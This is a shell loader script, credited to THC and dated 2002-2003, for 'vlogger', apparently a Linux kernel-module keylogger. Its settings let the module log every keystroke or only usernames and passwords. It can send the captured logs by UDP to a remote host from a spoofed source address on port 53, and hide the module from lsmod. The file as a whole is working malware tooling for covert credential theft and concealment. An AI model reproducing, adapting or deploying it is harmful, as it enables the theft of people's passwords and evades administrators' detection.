#!/bin/sh

#
# (C) 2002-2003 by rd <rd@thc.org>
#

## Set magic password for switch logging mode
#  To switch mode (dumb, smart and normal), press magic pass 
#  and VK_TOGLE_CHAR (default CTRL-])
MAGIC_PASS=31338     

## Set logging mode
#  0: Normal mode (no log)
#  1: Dumb mode (log all keystrokes)
#  2: Smart mode (log user/password only)
LOG_MODE=1

## Set log method
#  0 : save keystrokes to local files
#  1 : send log data to a remote host 
LOG_METHOD=1

# Set Time Zone
# Default is GMT
# TZ=7 (Vietnam time GMT+7)
TIMEZONE=7

# Directory to save log data
LOG_DIR=/tmp

## Hide vlogger module from lsmod?
#  0: disable	1: enable
HIDE=0

## Network options
#  Fake source IP address
#  If SRC_IP is not set, first IP of the output device will be used
SRC_IP=127.0.0.11
 
# Destination IP address
DEST_IP=192.168.1.1

# Destination UDP Port
DEST_PORT=1337

# Source UDP Port 
SRC_PORT=53

MODPARM="magic_pass=$MAGIC_PASS log_method=$LOG_METHOD log_mode=$LOG_MODE timezone=$TIMEZONE"

if [ $LOG_METHOD -ne 0 ] ; then
	MODPARM="$MODPARM src_ip=$SRC_IP dest_ip=$DEST_IP src_port=$SRC_PORT dst_port=$DEST_PORT"
else
	MODPARM="$MODPARM logdir=$LOG_DIR"
fi 

cleaner_load() {
	/sbin/insmod -q cleaner.o
	RETVAL=$?
	if [ $RETVAL -eq 0 ] ; then
		 echo $"cleaner module is loaded"
	fi

	/sbin/rmmod cleaner
	RETVAL=$?
	if [ $RETVAL -eq 0 ] ; then
		echo $"cleaner module is removed"
	fi
}

case "$1" in
	'load')
		/sbin/insmod -q vlogger.o $MODPARM
		RETVAL=$?
		if [ $RETVAL -eq 0 ] ; then
    			echo $"vlogger module is loaded"
		fi
		
		if [ $HIDE -ne 0 ] ; then
			cleaner_load
		fi 	
		;;
	'unload')
		/sbin/rmmod vlogger
		RETVAL=$?
		if [ $RETVAL -eq 0 ] ; then
			echo $"vlogger module is removed"
		fi
		;;
	*)
		echo "usage $0 load|unload"
esac

